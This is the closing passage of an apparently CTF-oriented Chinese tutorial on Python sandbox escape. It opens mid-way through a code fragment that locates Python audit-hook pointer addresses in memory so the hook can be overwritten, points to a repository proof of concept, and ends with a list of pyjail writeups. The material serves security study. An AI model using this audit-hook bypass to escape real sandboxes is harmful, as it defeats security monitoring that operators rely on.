                print("C ",f"index=({j}, {i})", f"offset={hex(get_runtime_audit_hook_ptr_addr() - nptr)}", hex(nptr))
            if hex(nptr)[:6] == hex(get_interp_audit_hook_ptr_addr())[:6] and len(hex(nptr)) == len(hex(get_interp_audit_hook_ptr_addr())):
                print("PY",f"index=({j}, {i})", f"offset={hex(get_interp_audit_hook_ptr_addr() - nptr)}", hex(nptr))
    ```

#### 覆盖 audit hook
实际利用时可使用仓库中的 POC2-no-ctypes.py

## 参考资料
- [Python沙箱逃逸小结](https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals)
- [Python 沙箱逃逸的经验总结](https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E5%89%8D%E8%A8%80)
- [Python 沙箱逃逸的通解探索之路](https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/)
- [python沙箱逃逸学习记录](https://xz.aliyun.com/t/12303#toc-11)
- [Bypass Python sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [[PyJail] python沙箱逃逸探究·上（HNCTF题解 - WEEK1）](https://zhuanlan.zhihu.com/p/578986988)
- [[PyJail] python沙箱逃逸探究·中（HNCTF题解 - WEEK2）](https://zhuanlan.zhihu.com/p/579057932)
- [[PyJail] python沙箱逃逸探究·下（HNCTF题解 - WEEK3）](https://zhuanlan.zhihu.com/p/579183067)
- [audited2](https://ctftime.org/writeup/31883)
- [【ctf】HNCTF Jail All In One](https://www.woodwhale.top/archives/hnctfj-ail-all-in-one)
- [HAXLAB — Endgame Pwn](https://ctftime.org/writeup/28286)
- [Python沙箱逃逸的n种姿势](https://ctftime.org/writeup/28286)
- [hxp2020-audited](https://pullp.github.io/writeup/2020/12/26/hxp2020-audited.html)
- [[DiceCTF 2024] IRS](https://maplebacon.org/2024/02/dicectf2024-irs/)